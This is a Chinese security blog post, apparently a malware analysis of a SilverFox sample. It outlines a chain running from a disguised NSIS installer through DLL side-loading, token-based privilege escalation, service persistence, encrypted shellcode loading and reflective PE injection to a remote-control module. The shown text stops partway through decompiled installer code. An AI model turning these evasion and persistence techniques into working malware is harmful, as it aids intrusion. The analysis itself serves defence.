@@ -1,0 +1,1306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    
+    <meta name="author" content="Shad0hun">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://shad0hun.github.io/2026/05/04/样本分析/【样本分析】捕捉到待修改使用远控框架！silverfox最新样本样本详细分析（从钓鱼到最终载荷）（2025-5-1）/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【样本分析】捕捉到待修改使用远控框架！SilverFox最新样本样本详细分析（从钓鱼到最终载荷）（2025-5-1）">
+<meta property="og:url" content="https://shad0hun.github.io/2026/05/04/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E3%80%90%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E3%80%91%E6%8D%95%E6%8D%89%E5%88%B0%E5%BE%85%E4%BF%AE%E6%94%B9%E4%BD%BF%E7%94%A8%E8%BF%9C%E6%8E%A7%E6%A1%86%E6%9E%B6%EF%BC%81SilverFox%E6%9C%80%E6%96%B0%E6%A0%B7%E6%9C%AC%E6%A0%B7%E6%9C%AC%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90%EF%BC%88%E4%BB%8E%E9%92%93%E9%B1%BC%E5%88%B0%E6%9C%80%E7%BB%88%E8%BD%BD%E8%8D%B7%EF%BC%89%EF%BC%882025-5-1%EF%BC%89/index.html">
+<meta property="og:site_name" content="Shad0hun&#39;s blog">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://shad0hun.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-05-04T07:11:41.000Z">
+<meta property="article:modified_time" content="2026-05-04T11:04:35.536Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="样本分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://shad0hun.github.io/images/redefine-og.webp">
+    
+    
+        <!-- Google tag (gtag.js) -->
+        <script src="https://www.googletagmanager.com/gtag/js?id=G-2P50D0W8WD"></script>
+        <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-2P50D0W8WD');
+        </script>
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            【样本分析】捕捉到待修改使用远控框架！SilverFox最新样本样本详细分析（从钓鱼到最终载荷）（2025-5-1） | Shadohun&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+    
+        
+<script src="/js/build/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"shad0hun.github.io","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":null,"url":null},"english":{"enable":true,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":false},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":"有空多读书，没事早点睡"},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":true,"id":"G-2P50D0W8WD"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/Shad0hun_background.webp","dark":"/images/Shad0hun_dark.webp"},"title":"Shad0hun's Blog","subtitle":{"text":["愿许秋风知我意，散我心中意难平"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":[],"qrs":[]}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"info","announcement":"致力于APT高级威胁分析，二进制漏洞挖掘\n在努力中...","show_on_mobile":true,"links":{"档案":{"path":"/archives","icon":"fa-regular fa-archive"},"标签":{"path":"/tags","icon":"fa-regular fa-tags"},"分类":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":100,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footer":{"runtime":true,"icon":"<i class=\"fa-solid fa-heart fa-beat\" style=\"--fa-animation-duration: 0.5s; color: #f54545\"></i>","start":"2025/1/22 22:45:14","statistics":true,"customize":null,"icp":{"enable":false,"number":null,"url":null}},"footerStart":"2025/1/22 22:45:14","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.i18n = {"search":"Search...","toc":"On this page","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"POWERED BY %s","theme":"THEME","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","post":"Post","posts":"Posts","tagcloud":"Tag Cloud","comment":"Comment","comments":"Comments","home":"Home","archive":"Archive","archives":"Archives","top":"TOP","sticky":"Sticky","go-back-home":"Go Back Home","masonry_loading":"Loading photos...","image_viewer":"Image viewer","close":"Close","exif":{"title":"EXIF","cards":{"camera":"Camera","lens":"Lens","exposure":"Exposure","other":"Other"},"fields":{"make":"Brand","model":"Model","date_taken":"Date taken","lens_model":"Lens","focal_length":"Focal length","focus_mode":"Focus mode","shutter":"Shutter","aperture":"Aperture","iso":"ISO","exposure_program":"Exposure program","exposure_compensation":"Exposure compensation","metering_mode":"Metering mode","flash":"Flash","white_balance":"White balance","latitude":"Latitude","longitude":"Longitude","altitude":"Altitude"},"status":{"loading":"Loading...","no_exif":"No EXIF available","library_missing":"EXIF library not loaded","image_source_missing":"Image source unavailable","unavailable":"EXIF unavailable (blocked by CORS or missing metadata)","flag_unavailable":"EXIF unavailable"}},"about":"About","changelog":"Changelog","links":"Links","link":"Link","friends":"Friends","friend":"Friend","timeline":"Timeline","shuoshuo":"Shuoshuo","bookmarks":"Bookmarks","site_uv":"VISITOR COUNT","site_pv":"TOTAL PAGE VIEWS","read_more":"Read more","wordcount":"Words","min2read":"Mins","status":"Status","runtime":"Blog up for","days":"days","hours":"hrs","minutes":"Min","seconds":"Sec","optimized_by":"and Optimized by Evan","rights":"All Rights Reserved","site_posts":"%s posts in total","site_wordcount":"%s words in total","copyright":{"author":"Author","title":"Title","link":"Link","create_time":"Created at","update_time":"Updated at","license_title":"License","license_content":"This work is licensed under %s.","all_rights_reserved":"All Rights Reserved &#169; %s","public_domain":"This work is in the public domain."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"},"create_time":"Created","update_time":"Updated","expired":"This post is written %s days ago, and the content may not be up to date."};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        有空多读书，没事早点睡
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({ loop: true })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [20, 0],
+                translateZ: 0,
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
+                easing: "easeOutExpo",
+                duration: 1200,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
+                complete: function() {
+                    hidePreloader();
+                }
+            }, '-=700');
+
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Shadohun&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/archives"
+                        >
+                            <span>档案</span>
+                            <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>标签</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/categories"
+                        >
+                            <span>分类</span>
+                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">23</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">【样本分析】捕捉到待修改使用远控框架！SilverFox最新样本样本详细分析（从钓鱼到最终载荷）（2025-5-1）</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/Shad0hun.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Shad0hun</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-05-04 15:11:41</span>
+        <span class="mobile">2026-05-04 15:11:41</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-05-04 19:04:35</span>
+            <span class="mobile">2026-05-04 19:04:35</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/">样本分析</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/">样本分析</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>本样本整体呈现出典型的<strong>多阶段投递 + 白加黑执行 + ShellCode分层加载 + 反射式PE注入</strong>的复杂攻击链结构，从初始伪装安装包到最终远控模块加载，形成完整的隐蔽执行体系。<br>该样本采用了典型的“安装器伪装 + 分阶段解密执行”的架构：</p>
+<ul>
+<li><strong>第一阶段：NSIS Installer 伪装载体</strong><ul>
+<li>使用 NSIS（Nullsoft Scriptable Install System）封装</li>
+<li>通过脚本驱动自动解压与执行</li>
+<li>内嵌 stub payload 作为解包入口</li>
+</ul>
+</li>
+<li><strong>第二阶段：NSIS Payload Loader</strong><ul>
+<li>解析 installer stub（<code>NullsoftInst</code> 标记）</li>
+<li>动态定位 payload 起始偏移</li>
+<li>进行内存申请 + 解压 + 校验执行流</li>
+<li>进入虚拟机解释器（NSIS VM）</li>
+</ul>
+</li>
+<li><strong>第三阶段：白加黑执行链</strong><ul>
+<li>利用<strong>合法签名程序（GameBox &#x2F; sysdiag）</strong></li>
+<li>通过 DLL 劫持加载 <code>Utility.dll</code></li>
+<li>触发导出函数执行恶意逻辑</li>
+</ul>
+</li>
+<li><strong>第四阶段：System级持久化与提权</strong><ul>
+<li>Token 复制（OpenProcessToken + DuplicateTokenEx）</li>
+<li>Session ID 绑定（WTSGetActiveConsoleSessionId）</li>
+<li>CreateProcessAsUser 提权执行</li>
+<li>注册 Service（<code>httpsvc</code>）</li>
+</ul>
+</li>
+<li><strong>第五阶段：ShellCode Loader</strong><ul>
+<li>AES-256-CBC 解密 payload（BCrypt API）</li>
+<li>VirtualAlloc + VirtualProtect 执行</li>
+<li>CreateThread 方式启动</li>
+</ul>
+</li>
+<li><strong>第六阶段：网络拉取第二阶段Payload</strong><ul>
+<li>Winsock TCP 通信</li>
+<li>分块接收 + XOR 解密</li>
+<li>动态拼装 ShellCode</li>
+</ul>
+</li>
+<li><strong>第七阶段：反射式 PE Loader</strong><ul>
+<li>手动解析 PE Header</li>
+<li>修复重定位表（Relocation Fix）</li>
+<li>重建 Import Table</li>
+<li>直接调用 EntryPoint 执行</li>
+</ul>
+</li>
+<li><strong>最终阶段：远控框架模块</strong><ul>
+<li>模块化 DLL（load &#x2F; run &#x2F; shangxianbiaoji）</li>
+<li>具备上线回传 + 指令执行能力</li>
+<li>典型 C2 远控架构</li>
+</ul>
+</li>
+</ul>
+<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在逛论坛的时候，发现了一个样本：<a class="link"   target="_blank" rel="noopener" href="https://bbs.kafan.cn/thread-2291368-1-1.html" >Silver Fox#火绒安全 白加黑(出处: 卡饭)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，由于正好五一放假闲来无事，来详细分析一下（剖析清楚恶意软件的功能，我感觉非常爽，哈哈哈哈哈哈哈啊哈），看一看SilverFox最近有没有用什么新技术。</p>
+<h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><h2 id="DIE"><a href="#DIE" class="headerlink" title="DIE"></a>DIE</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_DIE.png"
+                      alt="2026-5-2_DIE"
+                ><br>可以看到这是一个通过NSIS打包的安装程序。<br>NSIS 本身有个特点：它是“脚本驱动 + 自动解压执行”的也就是说：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setup.exe → 内置脚本 → 解压文件 → 执行程序</span><br></pre></td></tr></table></figure></div>
+<p>这也给了恶意样本伪装提供了遍历。</p>
+<h2 id="1-前置准备"><a href="#1-前置准备" class="headerlink" title="1.前置准备"></a>1.前置准备</h2><p>这里还是边分析边记录吧，最后给出注释好的main函数：<br>首先是准备环境：加载DLL等：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_Init.png"
+                      alt="2026-5-2_Init"
+                ><br>然后获取了当前命令行，后面有个循环，没进入，所以没有分析了：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_CmdLine.png"
+                      alt="2026-5-2_CmdLine"
+                ><br>然后获取了临时文件目录，并尝试创建临时文件，这里应该是测试，创建之后什么都没做就删除了：<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/Sample_analysis/2026-5-1/2026-5-2_TempDir.png"
+                      alt="2026-5-2_TempDir"
+                ><br>随后调用了<code>sub_4030A9</code>函数，该函数比较重要，是加载payload的主要函数。</p>
+<h2 id="2-payload加载（sub-4030A9）"><a href="#2-payload加载（sub-4030A9）" class="headerlink" title="2.payload加载（sub_4030A9）"></a>2.payload加载（sub_4030A9）</h2><p>这里有一个循环，在寻找<code>NSIS stub payload</code>：</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v3;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt;= (payload_start != <span class="number">0</span> ? <span class="number">0x8000</span> : <span class="number">512</span>) )</span><br><span class="line">        v4 = payload_start != <span class="number">0</span> ? <span class="number">0x8000</span> : <span class="number">512</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !ReadFileBySize(byte_416A20, v4) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( payload_start )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (Buffer &amp; <span class="number">2</span>) == <span class="number">0</span> )</span><br><span class="line">          sub_403045(<span class="number">0</span>);                        <span class="comment">// verifying installer: %d%%</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        sub_40605D(v12, (<span class="type">int</span>)byte_416A20, <span class="number">28</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (v12[<span class="number">0</span>] &amp; <span class="number">0xFFFFFFF0</span>) == <span class="number">0</span></span><br><span class="line">          &amp;&amp; v12[<span class="number">1</span>] == <span class="number">0xDEADBEEF</span></span><br><span class="line">          &amp;&amp; v12[<span class="number">4</span>] == <span class="string">&#x27;tsnI&#x27;</span></span><br><span class="line">          &amp;&amp; v12[<span class="number">3</span>] == <span 